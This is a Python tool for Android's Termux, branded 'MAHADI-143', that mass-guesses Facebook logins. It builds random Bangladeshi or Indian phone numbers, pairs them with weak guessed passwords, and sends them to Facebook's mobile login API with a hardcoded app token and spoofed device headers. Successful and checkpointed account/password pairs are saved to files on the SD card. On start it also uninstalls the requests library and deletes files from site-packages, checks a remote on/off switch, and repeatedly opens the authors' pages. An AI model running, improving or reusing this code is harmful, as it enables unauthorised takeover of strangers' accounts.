#-*-coding:utf-8-*-
#!/usr/bin/python3
import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct,string,uuid
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
rrq=("requests");mm=("uninstall")
try:
    os.system(f"pip {mm} {rrq} -y");os.system("rm -rf /data/data/com.termux/files/usr/lib/python3.11/"+"site-"+"packages/req"+"uests")
except requests.exceptions.ConnectionError:
    print("Net Error");exit()
try:
    import requests
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mMAHADI-143\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')

try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/SEFAT-MAHADI/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
            os.system('xdg-open https://github.com/SEFAT-MAHADI')
            print(f'\033[1;92m Tool is updating Wait For Complete The Update')
        exit()
    elif "off" in srv:
        os.system('clear')
        for j in range(1000):
            time.sleep(0.5)
            os.system('xdg-open https://github.com/MAHADI-143')
            print(f'\033[1;91m Tool is Currenty Off')
        exit()
except requests.exceptions.ConnectionError:
    print(f"\033[1;91m Connection Problem, Please Check Your Internet And Run Again")
    sys.exit()
    
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
AMSS1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat', 'MessengerLite', 'FB4A;FBAV', 'FB4A']
AMSS2=('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550   5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 'GT-E3309T', 'GT-G530H', 'GT-g900f', 'GT-G930F', 'GT-H9500', 'GT-I5508', 'GT-I5801', 'GT-I6410', 'GT-I8150', 'GT-I8160OKLTPA', 'GT-I8160ZWLTTT', 'GT-I8258', 'GT-I8262D', 'GT-I8268', 'GT-I8505', 'GT-I8530BAABTU', 'GT-I8530BALCHO', 'GT-I8530BALTTT', 'GT-I8550E', 'GT-i8700', 'GT-I8750', 'GT-I900', 'GT-I9008L', 'GT-i9040', 'GT-I9080E', 'GT-I9082C', 'GT-I9082EWAINU', 'GT-I9082i', 'GT-I9100G', 'GT-I9100LKLCHT', 'GT-I9100M', 'GT-I9100P', 'GT-I9100T', 'GT-I9105UANDBT', 'GT-I9128E', 'GT-I9128I', 'GT-I9128V', 'GT-I9158P', 'GT-I9158V', 'GT-I9168I', 'GT-I9192I', 'GT-I9195H', 'GT-I9195L', 'GT-I9250', 'GT-I9303I', 'GT-I9305N', 'GT-I9308I', 'GT-I9505G', 'GT-I9505X', 'GT-I9507V', 'GT-I9600', 'GT-m190', 'GT-M5650', 'GT-mini', 'GT-N5000S', 'GT-N5100', 'GT-N5105', 'GT-N5110', 'GT-N5120', 'GT-N7000B', 'GT-N7005', 'GT-N7100T', 'GT-N7102', 'GT-N7105', 'GT-N7105T', 'GT-N7108', 'GT-N7108D', 'GT-N8000', 'GT-N8005', 'GT-N8010', 'GT-N8020', 'GT-N9000', 'GT-N9505', 'GT-P1000CWAXSA', 'GT-P1000M', 'GT-P1000T', 'GT-P1010', 'GT-P3100B', 'GT-P3105', 'GT-P3108', 'GT-P3110', 'GT-P5100', 'GT-P5200', 'GT-P5210XD1', 'GT-P5220', 'GT-P6200', 'GT-P6200L', 'GT-P6201', 'GT-P6210', 'GT-P6211', 'GT-P6800', 'GT-P7100', 'GT-P7300', 'GT-P7300B', 'GT-P7310', 'GT-P7320', 'GT-P7500D', 'GT-P7500M', 'GT-P7500R', 'GT-P7500V', 'GT-P7501', 'GT-P7511', 'GT-S3330', 'GT-S3332', 'GT-S3333', 'GT-S3370', 'GT-S3518', 'GT-S3570', 'GT-S3600i', 'GT-S3650', 'GT-S3653W', 'GT-S3770K', 'GT-S3770M', 'GT-S3800W', 'GT-S3802', 'GT-S3850', 'GT-S5220', 'GT-S5220R', 'GT-S5222', 'GT-S5230', 'GT-S5230W', 'GT-S5233T', 'GT-s5233w', 'GT-S5250', 'GT-S5253', 'GT-s5260', 'GT-S5280', 'GT-S5282', 'GT-S5283B', 'GT-S5292', 'GT-S5300', 'GT-S5300L', 'GT-S5301', 'GT-S5301B', 'GT-S5301L', 'GT-S5302', 'GT-S5302B', 'GT-S5303', 'GT-S5303B', 'GT-S5310', 'GT-S5310B', 'GT-S5310C', 'GT-S5310E', 'GT-S5310G', 'GT-S5310I', 'GT-S5310L', 'GT-S5310M', 'GT-S5310N', 'GT-S5312', 'GT-S5312B', 'GT-S5312C', 'GT-S5312L', 'GT-S5330', 'GT-S5360', 'GT-S5360B', 'GT-S5360L', 'GT-S5360T', 'GT-S5363', 'GT-S5367', 'GT-S5369', 'GT-S5380', 'GT-S5380D', 'GT-S5500', 'GT-S5560', 'GT-S5560i', 'GT-S5570B', 'GT-S5570I', 'GT-S5570L', 'GT-S5578', 'GT-S5600', 'GT-S5603', 'GT-S5610', 'GT-S5610K', 'GT-S5611', 'GT-S5620', 'GT-S5670', 'GT-S5670B', 'GT-S5670HKBZTA', 'GT-S5690', 'GT-S5690R', 'GT-S5830', 'GT-S5830D', 'GT-S5830G', 'GT-S5830i', 'GT-S5830L', 'GT-S5830M', 'GT-S5830T', 'GT-S5830V', 'GT-S5831i', 'GT-S5838', 'GT-S5839i', 'GT-S6010', 'GT-S6010BBABTU', 'GT-S6012', 'GT-S6012B', 'GT-S6102', 'GT-S6102B', 'GT-S6293T', 'GT-S6310B', 'GT-S6310ZWAMID', 'GT-S6312', 'GT-S6313T', 'GT-S6352', 'GT-S6500', 'GT-S6500D', 'GT-S6500L', 'GT-S6790', 'GT-S6790L', 'GT-S6790N', 'GT-S6792L', 'GT-S6800', 'GT-S6800HKAXFA', 'GT-S6802', 'GT-S6810', 'GT-S6810B', 'GT-S6810E', 'GT-S6810L', 'GT-S6810M', 'GT-S6810MBASER', 'GT-S6810P', 'GT-S6812', 'GT-S6812B', 'GT-S6812C', 'GT-S6812i', 'GT-S6818', 'GT-S6818V', 'GT-S7230E', 'GT-S7233E', 'GT-S7250D', 'GT-S7262', 'GT-S7270', 'GT-S7270L', 'GT-S7272', 'GT-S7272C', 'GT-S7273T', 'GT-S7278', 'GT-S7278U', 'GT-S7390', 'GT-S7390G', 'GT-S7390L', 'GT-S7392', 'GT-S7392L', 'GT-S7500', 'GT-S7500ABABTU', 'GT-S7500ABADBT', 'GT-S7500ABTTLP', 'GT-S7500CWADBT', 'GT-S7500L', 'GT-S7500T', 'GT-S7560', 'GT-S7560M', 'GT-S7562', 'GT-S7562C', 'GT-S7562i', 'GT-S7562L', 'GT-S7566', 'GT-S7568', 'GT-S7568I', 'GT-S7572', 'GT-S7580E', 'GT-S7583T', 'GT-S758X', 'GT-S7592', 'GT-S7710', 'GT-S7710L', 'GT-S7898', 'GT-S7898I', 'GT-S8500', 'GT-S8530', 'GT-S8600', 'GT-STB919', 'GT-T140', 'GT-T150', 'GT-V8a', 'GT-V8i', 'GT-VC818', 'GT-VM919S', 'GT-W131', 'GT-W153', 'GT-X831', 'GT-X853', 'GT-X870', 'GT-X890', 'GT-1060', 'GT-1065', 'GT-1070', 'GT-1075', 'GT-1080', 'GT-1085', 'GT-1090', 'GT-1230', 'GT-1490', 'GT-1470', 'GT-18780', 'GT-18762', 'GT-19090I', 'GT-19092', 'GT-19073', 'GT-19164', 'GT-19632', 'GT-19912', 'GT-19301', 'GT-19705', 'GT-2010', 'GT-20020', 'GT-210s', 'GT-3010', 'GT-416XOP', 'GT-6998', 'GT-7090', 'GT-7060', 'GT-7080', 'GT-7150', 'GT-7950', 'GT-N7100', 'GT-N7105', 'GT-7120', 'GT-7275', 'GT-7250', 'GT-7260R', 'GT-7255', 'GT-7313', 'GT-7317', 'GT-7322', 'GT-7329', 'GT-7323', 'GT-7330', 'GT-7409', 'GT-7560 5GT-8005', 'GT-8070', 'GT-85', 'GT-815', 'GT-8155', 'GT-8115', 'GT-8225S', 'GT-8418', 'GT-9500I', 'GT-9370', 'GT-96G', 'GT-A7300', 'GT-A9700', 'GT-ANDROID', 'GT-B2990', 'GT-B5350', 'GT-B5370F', 'GT-B5360Z', 'GT-B5330FXXINU', 'GT-B5710', 'GT-B5519', 'GT-B5842', 'GT-B7910', 'GT-B7922', 'GT-B7830', 'GT-B9190', 'GT-B9398', 'GT-C3410', 'GT-C3363', 'GT-C3310Q', 'GT-C3342', 'GT-C3315X', 'GT-C3316H', 'GT-C3232', 'GT-C3422i', 'GT-C3560', 'GT-C3420I', 'GT-C3582', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-A520F', 'SM-A510FD', 'SM-A530', 'SM-A530F', 'SM-N950F', 'SM-G5510', 'SM-G5510F', 'SM-G530F', 'SM-G531F', 'SM-G532F', 'SM-G531H', 'SM-J100', 'SM-J100H', 'SM-J110', 'SM-J110H', 'SM-J120H', 'SM-J200H', 'SM-J200F', 'SM-J300H', 'SM-J3110', 'SM-J400', 'SM-J500M', 'SM-J500F', 'SM-J510F', 'SM-J510FD', 'SM-J520F', 'SM-J530F', 'SM-A310F', 'SM-A320F', 'SM-A320FD', 'SM-A600M', 'SM-A600F', 'SM-A710F', 'SM-A720FD', 'SM-F022', 'SM-A127F', 'SM-A125F', 'SM-C7000', 'SM-7100', 'SM-C7010Z', 'SM-C7010F', 'SM-A600FN', 'SM-7562I', 'SM-7572', 'SM-7562', 'SM-7010H', 'GT-1060', 'GT-1065', 'GT-1070', 'GT-1075', 'GT-1080', 'GT-1085', 'GT-1090', 'GT-1230', 'GT-1490', 'GT-1470', 'GT-18780', 'GT-18762', 'GT-19090I', 'GT-19092', 'GT-19073', 'GT-19164', 'GT-19632', 'GT-19912', 'GT-19301', 'GT-19705', 'GT-2010', 'GT-20020', 'GT-210s', 'GT-3010', 'GT-416XOP', 'GT-6998', 'GT-7090', 'GT-7060', 'GT-7080', 'GT-7150', 'GT-7950', 'GT-N7100', 'GT-N7105', 'GT-7120', 'GT-7275', 'GT-7250', 'GT-7260R', 'GT-7255', 'GT-7313', 'GT-7317', 'GT-7322', 'GT-7329', 'GT-7323', 'GT-7330', 'GT-7409', 'GT-7560 5GT-8005', 'GT-8070', 'GT-85', 'GT-815', 'GT-8155', 'GT-8115', 'GT-8225S', 'GT-8418', 'GT-9500I', 'GT-9370', 'GT-96G', 'GT-A7300', 'GT-A9700', 'GT-ANDROID', 'GT-B2990', 'GT-B5350', 'GT-B5370F', 'GT-B5360Z', 'GT-B5330FXXINU', 'GT-B5710', 'GT-B5519', 'GT-B5842', 'GT-B7910', 'GT-B7922', 'GT-B7830', 'GT-B9190', 'GT-B9398', 'GT-C3410', 'GT-C3363', 'GT-C3310Q', 'GT-C3342', 'GT-C3315X', 'GT-C3316H', 'GT-C3232', 'GT-C3422i', 'GT-C3560', 'GT-C3420I', 'GT-C3582', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'SM-A500F', 'SM-A500FU', 'SM-A500H', 'SM-G532F', 'SM-G900F', 'SM-G920F', 'SM-G930F', 'SM-G935', 'SM-G950F', 'SM-J320F', 'SM-J320FN', 'SM-J320H', 'SM-J320M', 'SM-J510FN', 'SM-J701F', 'SM-N920S', 'SM-A520F', 'SM-A510FD', 'SM-A530', 'SM-A530F', 'SM-N950F', 'SM-G5510', 'SM-G5510F', 'SM-G530F', 'SM-G531F', 'SM-G532F', 'SM-G531H', 'SM-J100', 'SM-J100H', 'SM-J110', 'SM-J110H', 'SM-J120H', 'SM-J200H', 'SM-J200F', 'SM-J300H', 'SM-J3110', 'SM-J400', 'SM-J500M', 'SM-J500F', 'SM-J510F', 'SM-J510FD', 'SM-J520F', 'SM-J530F', 'SM-A310F', 'SM-A320F', 'SM-A320FD', 'SM-A600M', 'SM-A600F', 'SM-A710F', 'SM-A720FD', 'SM-F022', 'SM-A127F', 'SM-A125F', 'SM-C7000', 'SM-7100', 'SM-C7010Z', 'SM-C7010F', 'SM-A600FN', 'SM-7562I', 'SM-7572', 'SM-7562', 'SM-7010H')

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
              
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\033[1;31m"
green="\033[1;32m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;41m"
pvt = "\033[1;0m"
my_color = [white,blue,green]
warna = random.choice(my_color)

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

os.system('xdg-open https://github.com/SEFAT-MAHADI')
def logo():
    os.system('clear')
    print(f"""       {green}┏━━━━━━━━━━━━━━━━━━━┓
       {green}┃{white}{faltu}MAHADI HASAN AFRIDI{pvt}{green}┃
{green}╔━━━━━━┻━━━━━━━━━━━━━━━━━━━┻━━━━━━╗
{green}┃{white}╔╦╗{green}╔═╗{rad}╦ ╦{yellow}╔═╗{cyan}╔╦╗{yelloww}╦ {rad}╔═╗╔═╗╔═╗╔═╗╔╦╗ {green}┃
{green}┃{white}║║║{green}╠═╣{rad}╠═╣{yellow}╠═╣{cyan} ║║{yelloww}║{yellow}X{white}╚═╗║╣ ╠╣ ╠═╣ ║{green}  ┃
{green}┃{white}╩ ╩{green}╩ ╩{rad}╩ ╩{yellow}╩ ╩{cyan}═╩╝{yelloww}╩ {rad}╚═╝╚═╝╚  ╩ ╩ ╩  {green}┃
{green}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
{green}┃{white}<> {purple}DEVOLPER {yelloww}: {yellow}MAHADI HASAN AFRIDI{green}┃
{green}┃{white}<> {cyan}DEVOLPER {yelloww}: {rad}SEFAT SARKER       {green}┃
{green}┃{white}<> {rad}TOOLS    {yelloww}: {blue}FREE BD/INDIA RNDM {green}┃
{green}┃{white}<> {yellow}VERSION  {yelloww}: {white}{faltu}0.29{pvt}     {green}          ┃
{green}┃{white}<> {yelloww}GITHUB   {yelloww}: {white}SEFAT-MAHADI       {green}┃
{green}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")

def linex():
        print(f"{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

def mahadi():
    os.system('clear')
    logo()
    print(f"{white}[{green}A{white}] {green}START RANDOM CRACKING")
    print(f"{white}[{green}B{white}] {green}MAIN ADMIN FB ACCOUNT")
    print(f"{white}[{green}C{white}] {green}JOIN MESSENGER GROUP")
    print(f"{white}[{green}D{white}] {green}EXIT PROGRAMMING")
    _____mahadi_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if _____mahadi_____ in ['A','a','01','1']:
        os.system('xdg-open https://www.facebook.com/SeFAt.SaRkeR.004')
        ___turabba___()
    elif _____mahadi_____ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/M4HADI.143')
    elif _____mahadi_____ in ['C','c','03','3']:
        os.system('xdg-open https://m.me/j/Abbh_VtYZ3YtOpBX/')
    elif _____mahadi_____ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');mahadi()

def ___turabba___():
    os.system('clear')
    logo()
    print(f"{white}[{green}A{white}] {green}START BD RANDOM")
    print(f"{white}[{green}B{white}] {green}START INDIA RANDOM")
    print(f"{white}[{green}×{white}] {green}START PK RANDOM")
    ____power_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if ____power_____ in ['A','a','01','1']:
        os.system('xdg-open https://github.com/SEFAT-MAHADI')
        ___uids___()
    elif ____power_____ in ['B','b','02','2']:
        os.system('xdg-open https://github.com/SEFAT-MAHADI')
        ___Indian___()
    elif ____power_____ in ['C','c','03','3']:
        os.system('xdg-open https://github.com/SEFAT-MAHADI')
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');mahadi()

def ___uids___():
    user=[]
    os.system('clear')
    logo()
    print(f"{white}[{green}+{white}] BD SIM CODE {green}: 017 015 018 019")
    os.system('xdg-open https://www.facebook.com/M4HADI.143')
    code = input(f"{white}[{green}+{white}] SELECT      {green}: {white}")
    print(f"{white}[{green}+{white}] EXAMPLE {green}    : 1000,5000,10000")
    os.system('xdg-open https://www.facebook.com/M4HADI.143')
    limit = int(input(f"{white}[{green}+{white}] LIMIT       {green}: {white}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as MahadiSefat:
        os.system('clear')
        logo()
        tl = str(len(user))
        print(f'{green}┏━[{rad}+{green}] TOTAL ACCOUNT {yelloww}:  {white}'+tl)
        print(f'{green}┣━[{rad}+{green}] BD SIM CODE   {yelloww}: {white} {code} ')
        print(f'{green}┗━[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLAN ')
        linex()
        for love in user:
           ids = code+love
           au = love[:6]
           bu = ids[:8]
           passlist = [love,ids,au,bu, 'bangla', 'Bangla', 'Free Fire', 'free fire', '@#@#@#']
           MahadiSefat.submit(___random___,ids,passlist)
    print('')
    linex()
    print(f"{green}┏━[{rad}+{green}] PROCESS HAS BEEN COMPLETED")
    print(f"{green}┗━[{rad}+{green}] TOTAL ID : {white}{len(oks)}")
    linex()
    exit()

def ___Indian___():
    user=[]
    os.system('clear')
    logo()
    code = '+91637'
    print(f"{white}[{green}+{white}] EXAMPLE {green}    : 1000,5000,10000")
    os.system('xdg-open https://github.com/SEFAT-MAHADI')
    limit = int(input(f"{white}[{green}+{white}] LIMIT       {green}: {white}"))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as MahadiSefat:
        os.system('clear')
        logo()
        tl = str(len(user))
        print(f'{green}┏━[{rad}+{green}] TOTAL ACCOUNT {yelloww}:  {white}'+tl)
        print(f'{green}┣━[{rad}+{green}] PASSWORD      {yelloww}:  {white}57273200 ')
        print(f'{green}┗━[{rad}+{green}] IF NO RESULT {rad}[{yelloww}ON{white}/{yelloww}OFF{rad}] {green}AIRPLAN ')
        linex()
        for love in user:
           ids = code+love
           passlist = [love, '57273200']
           MahadiSefat.submit(___random___,ids,passlist)
    print('')
    linex()
    print(f"{green}┏━[{rad}+{green}] PROCESS HAS BEEN COMPLETED")
    print(f"{green}┗━[{rad}+{green}] TOTAL ID : {white}{len(oks)}")
    linex()
    exit()

def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green}FINDING{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}ALIVE:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
            application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
            application_version_code=str(random.randint(000000000,999999999))
            fbs=random.choice(fbks)
            accessToken="350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            awmsim = random.choice(AMSS1)
            gtt=random.choice(AMSS2)
            gttt=random.choice(AMSS2)
            android_version=str(random.randrange(6,13))
            ___khankirfula___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.275,width=540,height=1071};'+f'FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/DOOGEE;FBBD/DOOGEE;FBPN/{str(fbs)};FBDV/X70;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {
            'adid':adid,
            'format':'json',
            'device':gtt,
            'device_id':adid,
            'email':ids,
            'password':pas,
            "logged_out_id": str(uuid.uuid4()),
            "hash_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            'generate_analytics_claims':'1',
            'credentials_type':'password',
            'source':'login',
            "sim_country": "id",
            "network_country": "id",
            "relative_url": "method/auth.login",
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            "locale":"en_US","client_country_code":"US",
            'fb_api_req_friendly_name':'authenticate',
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={
            'Authorization':f'OAuth {accessToken}',
            "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-FB-device-group': str(random.randint(2000, 4000)),
            "X-FB-Friendly-Name": "ViewerReactionsMutation",
            "X-FB-Request-Analytics-Tags": "graphservice",
            'X-FB-Friendly-Name':'authenticate',
            'X-FB-Connection-Type':'unknown',
            'X-FB-connection-quality':'EXCELLENT',
            "X-Tigon-Is-Retry": "False",
            'User-Agent':___khankirfula___,
            "X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            'Accept-Encoding':'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            "X-FB-Client-IP": "True",
            "X-FB-Server-Cluster": "True",
            'X-FB-HTTP-Engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                uid=str(q['uid'])
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print('\r\r\033[1;31m[\033[1;32mALIVE\033[1;31m]\033[1;32m '+uid+'\033[1;33m•\033[1;32m'+pas+'  \033[1;37m')
                    open('/sdcard/ALIVE-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                #print(f'\r\r\x1b[38;5;208m[DIED] '+ids+'\033[1;32m•\x1b[38;5;208m'+pas+'\033[1;97m'  )
                open('/sdcard/ALIVE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass

        
if __name__=="__main__":
    os.system('clear')
    os.system('git pull')
mahadi()
